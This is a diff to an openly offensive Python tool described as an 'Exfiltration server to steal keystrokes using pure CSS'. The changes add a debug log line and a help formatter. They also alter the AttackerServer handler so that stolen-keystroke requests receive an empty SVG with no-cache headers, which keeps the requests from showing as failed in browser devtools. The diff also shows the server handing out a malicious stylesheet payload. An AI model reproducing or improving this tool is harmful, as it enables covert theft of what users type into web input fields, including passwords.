@@ -10,9 +10,10 @@ Start server to receive key strokes inside any input field:
 \tpython3 server.py -e input -a value'''
 
 # Initialize argument parsing
+class CustomFormatter(argparse.ArgumentDefaultsHelpFormatter, argparse.RawDescriptionHelpFormatter): pass
 parser = argparse.ArgumentParser(
     epilog=description,
-    formatter_class=argparse.RawDescriptionHelpFormatter,
+    formatter_class=CustomFormatter,
     description="Exfiltration server to steal keystrokes using pure CSS")
 
 scan_group = parser.add_argument_group('PARAMETERS')
@@ -100,6 +101,7 @@ def generate_keys(file_name: str) -> list:
         if remaining <= 0:
             break
         amount = min(remaining, math.ceil(len(json_obj[str(k)]) * top_most))
+        logger.debug(f"Adding {amount} {k}-character combinations")
         keys.extend(json_obj[str(k)][:amount])
         top_most *= 0.5
 
@@ -187,7 +189,11 @@ class AttackerServer(BaseHTTPRequestHandler):
             stroke = "".join([chr(int(k, 16)) for k in keys])
             merge_stroke(stroke)
 
-            self.send_header('Content-type', 'text/plain')
+            self.send_header('Content-type', 'image/svg+xml')
+            self.send_header('Cache-Control', 'no-store, must-revalidate')
+            self.send_header('Expires', '0')
+            # response with empty svg (quite useless, but the requests won't get displayed as failed in the devtools)
+            response = '<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg" width="0" height="0"></svg>'
         # client requests malicious payload
         elif path == "/style.css":
             # Reset keystrokes
